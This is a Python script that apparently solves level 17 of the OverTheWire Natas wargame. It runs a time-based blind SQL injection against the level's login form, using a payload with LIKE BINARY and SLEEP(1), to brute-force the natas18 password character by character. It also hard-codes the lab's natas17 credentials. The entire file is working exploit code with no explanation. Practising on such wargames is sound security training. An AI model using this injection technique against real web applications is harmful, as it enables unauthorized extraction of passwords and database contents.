```
#!/usr/bin/env python
import requests
import re
from string import ascii_lowercase, ascii_uppercase, digits
from time import *

characters = ascii_lowercase + ascii_uppercase + digits

username = 'natas17'
password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'

url = 'http://%s.natas.labs.overthewire.org' % username

session = requests.Session()

seen_password = list()
while (len(seen_password)<32):
	for character in characters:
		start_time = time()
		print ("Trying", "".join(seen_password) + character)
		response = session.post(url, data = {"username": 'natas18" AND password LIKE BINARY "' + "".join(seen_password) + character + '%" AND SLEEP(1) # '}, auth = (username, password))
		content = response.text
		end_time = time()
		difference = end_time - start_time

		if ( difference > 1 ):
			seen_password.append(character)
			break
```
